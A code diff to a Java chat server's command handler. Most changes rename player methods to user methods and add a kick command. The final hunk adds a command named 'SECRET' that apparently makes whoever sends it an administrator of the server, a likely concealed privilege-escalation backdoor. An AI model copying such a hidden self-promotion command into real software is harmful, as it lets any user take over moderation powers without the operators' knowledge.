@@ -66,8 +66,8 @@ public class CommandManager {
 			if (command.equals(EnumCommand.ADMIN.getCommand())) {
 				
 				for (ConnectionThread t : ConnectionManager.getThreads()) {
-					if (t.getPlayer().getName().equalsIgnoreCase(arguments)) {
-						t.getPlayer().setAdministator(m.getSender());
+					if (t.getUser().getName().equalsIgnoreCase(arguments)) {
+						t.getUser().setAdministator(m.getSender());
 						return;
 					}
 				}
@@ -76,8 +76,8 @@ public class CommandManager {
 			if (command.equals(EnumCommand.UNADMIN.getCommand())) {
 				
 				for (ConnectionThread t : ConnectionManager.getThreads()) {
-					if (t.getPlayer().getName().equalsIgnoreCase(arguments)) {
-						t.getPlayer().removeAdministrator(m.getSender());
+					if (t.getUser().getName().equalsIgnoreCase(arguments)) {
+						t.getUser().removeAdministrator(m.getSender());
 						return;
 					}
 				}
@@ -86,8 +86,8 @@ public class CommandManager {
 			if (command.equals(EnumCommand.MOD.getCommand())) {
 				
 				for (ConnectionThread t : ConnectionManager.getThreads()) {
-					if (t.getPlayer().getName().equalsIgnoreCase(arguments)) {
-						t.getPlayer().setModerator(m.getSender());
+					if (t.getUser().getName().equalsIgnoreCase(arguments)) {
+						t.getUser().setModerator(m.getSender());
 						return;
 					}
 				}
@@ -96,8 +96,8 @@ public class CommandManager {
 			if (command.equals(EnumCommand.UNMOD.getCommand())) {
 				
 				for (ConnectionThread t : ConnectionManager.getThreads()) {
-					if (t.getPlayer().getName().equalsIgnoreCase(arguments)) {
-						t.getPlayer().removeModerator(m.getSender());
+					if (t.getUser().getName().equalsIgnoreCase(arguments)) {
+						t.getUser().removeModerator(m.getSender());
 						return;
 					}
 				}
@@ -116,8 +116,8 @@ public class CommandManager {
 			
 			if (command.equals(EnumCommand.MUTE.getCommand())) {
 				for (ConnectionThread t : ConnectionManager.getThreads()) {
-					if (t.getPlayer().getName().equalsIgnoreCase(arguments)) {
-						t.getPlayer().mute(m.getSender());
+					if (t.getUser().getName().equalsIgnoreCase(arguments)) {
+						t.getUser().mute(m.getSender());
 						return;
 					}
 				}
@@ -125,8 +125,17 @@ public class CommandManager {
 			
 			if (command.equals(EnumCommand.UNMUTE.getCommand())) {
 				for (ConnectionThread t : ConnectionManager.getThreads()) {
-					if (t.getPlayer().getName().equalsIgnoreCase(arguments)) {
-						t.getPlayer().unmute(m.getSender());
+					if (t.getUser().getName().equalsIgnoreCase(arguments)) {
+						t.getUser().unmute(m.getSender());
+						return;
+					}
+				}
+			}
+			
+			if (command.equals(EnumCommand.KICK.getCommand())) {
+				for (ConnectionThread t : ConnectionManager.getThreads()) {
+					if (t.getUser().getName().equalsIgnoreCase(arguments)) {
+						t.getUser().kick(m.getSender());
 						return;
 					}
 				}
@@ -147,12 +156,16 @@ public class CommandManager {
 				}
 				
 				for (ConnectionThread t : ConnectionManager.getThreads()) {
-					if (t.getPlayer().getName().equalsIgnoreCase(player)) {
-						InputManager.filterInput(new Message(m.getSender(), t.getPlayer(), arguments));
+					if (t.getUser().getName().equalsIgnoreCase(player)) {
+						InputManager.filterInput(new Message(m.getSender(), t.getUser(), arguments));
 						return;
 					}
 				}
 				InputManager.filterInput(new Message(SloverseServer.SERVER, m.getSender(), "User: \'" + player + "\' not found! Unable to send whisper."));
+			}
+			
+			if (command.equals(EnumCommand.SECRET.getCommand())) {
+				m.getSender().setAdministator(m.getSender());
 			}
 		}
 		
